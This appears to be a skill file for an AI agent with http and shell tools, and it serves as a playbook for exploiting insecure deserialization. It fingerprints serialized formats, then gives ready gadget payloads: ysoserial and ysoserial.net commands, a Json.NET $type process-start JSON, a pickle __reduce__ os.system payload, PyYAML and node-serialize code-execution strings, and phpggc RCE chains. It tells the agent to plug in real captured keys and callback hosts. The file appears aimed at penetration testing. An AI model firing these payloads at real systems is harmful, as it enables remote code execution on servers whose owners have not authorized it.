---
name: deserialize
description: Insecure-deserialization playbook — fingerprint the language/format (Java serialized, .NET BinaryFormatter, Python pickle, PHP unserialize, Node serialize, YAML/JSON-with-types), then build a working gadget chain with ysoserial / ysoserial.net / phpggc / custom pickle. Use when you see serialized blobs (rO0/AC ED, base64 ViewState, PHP O:) or a parameter/cookie that deserializes user input.
allowed-tools:
  - http
  - shell
  - read_payloads
  - file_write
---

# Insecure deserialization playbook

You suspect a server is deserializing attacker-influenced data. RCE is on the table — but only if you ship the right gadget chain.

Execution rule: use real captured parameters, cookies, keys, and callback hosts before running commands. Never write literal placeholders such as `<KEY>` or `<endpoint>` to files; if key material or a sample blob is missing, ask once.

## 1. Fingerprint the format

| Magic | Format |
|---|---|
| `rO0` (base64 of `\xac\xed`) | **Java serialized** |
| `\xac\xed\x00\x05` (raw) | **Java serialized** |
| `AAEAAAD/////` (base64) or `\x00\x01\x00\x00\x00\xff\xff\xff\xff` | **.NET BinaryFormatter** |
| `__viewstate` / `__VIEWSTATE` cookie or form field | **ASP.NET ViewState** (often `LosFormatter`/`BinaryFormatter` underneath) |
| `gASV` (base64 of `\x80\x05\x95`), `gAR`, `gAP` (`\x80\x04`, `\x80\x03`) | **Python pickle** |
| `O:` (e.g. `O:8:"stdClass":0:{}`) | **PHP serialize** |
| `_$$ND_FUNC$$_` / `IIFE` patterns | **Node `node-serialize`** |
| `!!` tags inside YAML / `!!python/object` | **YAML with type resolution** (PyYAML, SnakeYAML) |
| `BSON` / `BinData` | **MongoDB BSON** — deserialization paths usually safe; check anyway |

Source of the data matters: cookie, form field, file upload, query param, message queue, RPC framing.

## 2. Java

Default gadget toolkit: **ysoserial** (https://github.com/frohoff/ysoserial).

```sh
# Generate a payload using the CommonsCollections1 chain to run `id`
java -jar ysoserial.jar CommonsCollections1 'id' > payload.bin

# Test it
curl -X POST https://target/api/deserialize --data-binary @payload.bin -H "Content-Type: application/octet-stream"
```

Chains worth iterating through (depends on classpath):
- `CommonsCollections1..7` — Apache Commons Collections.
- `Spring1`, `Spring2`.
- `JRMPClient` / `JRMPListener` — when the only thing that deserializes is a JRMP endpoint; chain with a hosted JRMP listener.
- `URLDNS` — leak-only; useful as a confirm primitive (DNS hit proves deserialization happens).

**Confirm-first workflow:** start with `URLDNS` against a DNS canary. If you see the DNS hit, you have insecure deserialization. *Then* try RCE chains.

### ViewState (.NET, ASP.NET Web Forms)

If `__VIEWSTATE` is not MAC-protected, or the MAC key is leaked / weak / default, use `ysoserial.net`:

```sh
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "calc" \
  --path="/Default.aspx" --apppath="/" \
  --validationkey="<KEY>" --validationalg="HMACSHA256"
```

Confirming whether MAC is enforced: send `__VIEWSTATE=AAEAAAD/////AQAAAAA=` (a truncated stub). A `ViewState MAC validation failed` exception means MAC is on; a clean 500 deserialization stack trace means it's likely off.

## 3. .NET BinaryFormatter / Json.NET with TypeNameHandling

If you see Json.NET with `TypeNameHandling = Auto/Objects/All`, you can put `$type` in the payload:

```json
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList, mscorlib","$values":["cmd","/c calc"]},"ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}
```

Toolkit: **ysoserial.net** (https://github.com/pwntester/ysoserial.net) — covers BinaryFormatter, ObjectStateFormatter, NetDataContractSerializer, etc.

## 4. Python pickle

If you can submit raw pickled bytes (cookie, form, file upload, message queue payload), RCE is trivial:

```python
import pickle, os, base64
class E:
    def __reduce__(self):
        return (os.system, ('id > /tmp/proof',))
print(base64.b64encode(pickle.dumps(E())).decode())
```

Then submit base64 (or raw bytes, depending on transport).

Variants:
- `__reduce_ex__` instead of `__reduce__` when targeting specific protocols.
- `pickle.loads` on protocol-5 with out-of-band buffers — different surface.

### PyYAML

```yaml
!!python/object/apply:os.system ["id"]
```

Or:

```yaml
!!python/object/new:os.system ["id"]
```

Modern PyYAML defaults to `SafeLoader` — only `yaml.load()` (no Loader arg) on old versions is vulnerable, but plenty of code still uses `yaml.load(...)` explicitly.

## 5. PHP unserialize

If user input lands in `unserialize()`, look for **POP (Property-Oriented Programming) chains**: existing classes in the codebase with `__wakeup` / `__destruct` / `__toString` magic methods that can be chained.

Toolkit: **phpggc** (https://github.com/ambionics/phpggc).

```sh
phpggc -b Symfony/RCE4 system 'id'   # base64-encoded gadget for Symfony 4
phpggc Laravel/RCE6 system 'id'
phpggc Drupal7/FW1 phpinfo
```

Variants worth trying:
- `O:8:"stdClass":0:{}` — confirms `unserialize()` works at all (no exception).
- Phar deserialization: triggered by `file_exists("phar://...")` etc., not direct unserialize input. Look for `Phar`, `file_exists`, `is_file` with attacker-controlled paths.

## 6. Node — node-serialize

The npm `node-serialize` package's `unserialize()` accepts function strings prefixed with `_$$ND_FUNC$$_` and `eval`s them:

```javascript
{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('id');}()"}
```

This is a one-shot — modern code rarely uses it.

## 7. Confirming impact

Pickle / yysoserial / phpggc all support a DNS or HTTP callback gadget (e.g. `URLDNS` for Java, simple `system("curl ...")` for the others). Use those to confirm deserialization happens **before** firing real exec — easier to attribute, smaller blast radius.

Once confirmed, the exec PoC should:
- Run `id` and capture stdout, OR
- Read a non-sensitive file (`/etc/hostname`) and surface its content.

Don't drop a reverse shell on a real engagement without explicit written authorization.

## Reporting

Required:
- Format identified (Java serialized / pickle / etc.) with the magic-byte evidence.
- The exact endpoint + parameter / cookie that ingests it.
- A working gadget payload (base64'd if binary), and command run to generate it.
- Output of `id` (or equivalent proof) and the matching server response.
- Note any preconditions that limit exploitability (specific classpath, key disclosure required, etc.) — affects severity.
